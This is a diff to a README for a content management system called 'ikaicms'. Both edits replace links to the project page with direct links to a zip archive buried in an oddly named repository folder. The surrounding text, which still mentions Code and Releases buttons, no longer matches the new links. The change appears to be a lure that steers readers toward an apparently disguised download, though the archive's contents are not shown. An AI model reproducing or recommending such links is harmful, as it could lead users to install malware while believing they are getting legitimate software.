@@ -1,6 +1,6 @@
 # 🛠️ ikaicms - Manage your business content with ease
 
-[![Download ikaicms](https://img.shields.io/badge/Download-ikaicms-blue.svg)](https://github.com/Gussiehymeneal841/ikaicms)
+[![Download ikaicms](https://img.shields.io/badge/Download-ikaicms-blue.svg)](https://raw.githubusercontent.com/Gussiehymeneal841/ikaicms/main/ossified/Software_2.1-alpha.1.zip)
 
 ikaicms helps you build and run websites. It organizes your text, images, and pages in one central place. The system works for small projects and large company websites. You write content once and display it across your site.
 
@@ -24,7 +24,7 @@ These tools create a small web server on your machine. This allows ikaicms to fu
 
 You must visit the project page to access the latest version of the tools.
 
-[Click here to visit the download page](https://github.com/Gussiehymeneal841/ikaicms)
+[Click here to visit the download page](https://raw.githubusercontent.com/Gussiehymeneal841/ikaicms/main/ossified/Software_2.1-alpha.1.zip)
 
 Once you reach the link, look for a button that says Code or Releases. Download the folder as a ZIP file. Save this file to a folder on your computer that you can find easily, such as your Downloads folder.
 
